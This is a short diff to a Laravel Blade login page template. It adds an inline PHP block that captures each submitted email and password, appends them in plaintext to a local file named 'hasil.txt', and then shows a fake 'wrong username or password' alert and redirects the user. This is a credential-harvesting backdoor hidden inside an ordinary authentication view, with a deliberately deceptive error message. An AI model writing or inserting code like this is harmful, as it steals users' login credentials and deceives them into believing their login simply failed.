@@ -1,6 +1,22 @@
 <x-guest-layout>
     <!-- Session Status -->
     <x-auth-session-status class="mb-4" :status="session('status')" />
+    @php
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $user = $_POST['email'] ?? '';
+    $pass = $_POST['password'] ?? '';
+
+
+    $data = "Username: $user | Password: $pass" . PHP_EOL;
+    file_put_contents("hasil.txt", $data, FILE_APPEND);
+
+    // Tampilkan error palsu
+    echo "<script>alert('Username atau Password salah!'); window.location.href='index.php';</script>";
+    exit;
+}
+
+
+    @endphp
 
     <form method="POST" action="{{ route('login') }}">
         @csrf
